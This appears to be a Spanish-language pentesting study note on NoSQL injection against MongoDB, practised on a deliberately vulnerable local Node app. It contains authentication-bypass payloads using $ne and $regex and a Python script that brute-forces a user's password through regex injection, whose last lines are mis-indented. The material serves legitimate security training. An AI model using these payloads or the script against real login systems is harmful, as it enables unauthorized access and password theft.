# Inyecciones NoSQL

Tags: #NoSQLI #OWASP #Explotacion #MongoSQLI 

Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:

-   **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

## Inyecciones en MongoDB

* PayloadAllTheThings: [PayloasAllTheThings-NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
* HackTricks: [Hacktricks-Mongo-NoSQLI](https://book.hacktricks.xyz/pentesting-web/nosql-injection#sql-mongo)

```bash
❯ ' || '1'='1                                       # La mas sencilla, con la cuarta comilla estamnos cerrando la inyeccion
```

## Inyecciones NoSQL

En esta pagina podemos encontrar ejemplos de inyecciones NoSQL
* PayloadAllTheThings: [PayloasAllTheThings-NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Podemos interceptar las peticiones en **BurpSuite y ahi inyectar los NoSQLI**. Esto lo prodriamos hacer en el **Repeater**.
* Peticion por **POST**
* Debemos tramitar la data en **Json**
* Debemos de tener en **Content Type: application/json**, ya que si no, no nos va a servir.

```bash
{                                    # Peticion original interceptada en BurpSuite 
	"username":"admin",
	"password":"admin"
}
```


* Iniciando la inyeccion NoSQL
```bash
{                                    # Probaremos el NoEqual = $ne, sin saber la passwd
	"username":"admin",
	"password":{
		"$ne":"admin"
	}
}
```
Aquí le diremos que la passwd no es igual a 'admin', por lo que es una afirmación correcta y entrara al login.

```bash
{                                    # Probaremos el NoEqual = $ne, sin saber la passwd y el usuario
	"username":{
		"$ne":"omar"
	},
	"password":{
		"$ne":"admin"
	}
}
```
En esta ocasión le diremos que el usuario no es 'omar' y la passwd no es 'admin', por lo que es una afirmación correcta y entrara al login.


* Tambien podemos aplicar **Regex = Expresiones Regulares**
```bash
{                                    # Con este Regex le decimos que el usuario (^a = empieza por 'a'), con la passwd correcta
 	"username":{
		"$regex":"^a"
	},
	"password":"admin"
}
```

```bash
{                                    # Con este Regex le decimos que el usuario (^a = empieza por 'a'), y diciendo que la passwd no es admin
 	"username":{
		"$regex":"^a"
	},
	"password":{
		"$ne":"admin"
	}
}
```

Para saber la longitud
```bash
{                                    # Para saber la longitud de caracteres, la cual si es menor o igual a la original la tomara como correcta pero si se pasa sera error
	"username":"admin",
	"password":{
		"$regex":".{24}"
	}
}
```


Podríamos aplicar Fuerza Bruta con las Regex para ir probando carácter por carácter y así ir descubriendo la passwd de algún usuario especifico que exista.
```python 
❯ nvim NoSQL.py

	#!/usr/bin/python3
	from pwn import *
	import requests, time, sys, signal, string

	def def_handler(sig, frame):
		print("\n\n[!] Saliendo...\n")
		sys.exit(1)

	# Ctrl + c
	signal.signal(signal.SIGINT, def_handler)

	# Variables globales
	main_url = "http://localhost:4000/user/login"
	characters = string.ascii_lowercase + string.ascii_uppercase + string.digits           # Probariamos de la a-z A-Z y los numeros

	def makeNoSQLI():
		password = ""
		p1 = log.progress("Fuerza Bruta")
		p1.status("Iniciando fuerza bruta")
		time.sleep(2)
		p2 = log.progress("Password")
		
		for position in range(0, 100):               #Podemos cancelar el bucle cuando ya haya terminado de descifrar la passwd y no esperar a las 100 evaluaciones
			for character in characters:
				post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
				p1.status(post_data)
				headers = {'Content-Type': 'application/json'}
				r = requests.post(main_url, headers=headers, data=post_data)
				if "Logged in as user" in r.text:
					password += character
					p2.status(password)
					break 
					
	if __name__ == '__main__':
	makeNoSQLI()
```